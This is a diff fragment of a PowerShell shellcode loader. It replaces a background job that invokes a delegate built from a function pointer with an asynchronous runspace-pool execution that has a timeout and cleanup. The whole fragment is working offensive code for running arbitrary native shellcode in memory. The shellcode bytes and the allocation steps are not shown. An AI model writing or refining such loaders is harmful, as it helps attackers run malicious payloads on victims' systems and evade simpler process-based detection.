@@ -36,16 +36,35 @@ public delegate void ShellcodeDelegate();
 # Get delegate for function pointer
 $del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [ShellcodeDelegate])
 
-# Execute shellcode
-$job = Start-Job -ScriptBlock { 
-    $del.Invoke() 
+# Assuming $del is already defined as your delegate
+
+# Create runspace pool
+$runspacePool = [runspacefactory]::CreateRunspacePool(1, 2)
+$runspacePool.Open()
+
+# Create PowerShell instance and assign runspace pool
+$ps = [powershell]::Create()
+$ps.RunspacePool = $runspacePool
+
+# Add script to invoke the delegate
+$ps.AddScript({
+    param($del)
+    $del.Invoke()
+}).AddArgument($del) | Out-Null
+
+# Start async execution
+$asyncResult = $ps.BeginInvoke()
+
+# Wait for up to 10 seconds
+if ($asyncResult.AsyncWaitHandle.WaitOne(10000)) {
+    $ps.EndInvoke($asyncResult)
+    Write-Output "Shellcode executed successfully."
+} else {
+    Write-Warning "Shellcode execution timed out, stopping."
+    $ps.Stop()
 }
 
-# Wait up to 10 seconds for the job to finish
-if (Wait-Job $job -Timeout 10) {
-    Receive-Job $job
-} else {
-    Write-Output "Job timed out, stopping it."
-    Stop-Job $job
-}
-Remove-Job $job
+# Cleanup
+$ps.Dispose()
+$runspacePool.Close()
+$runspacePool.Dispose()
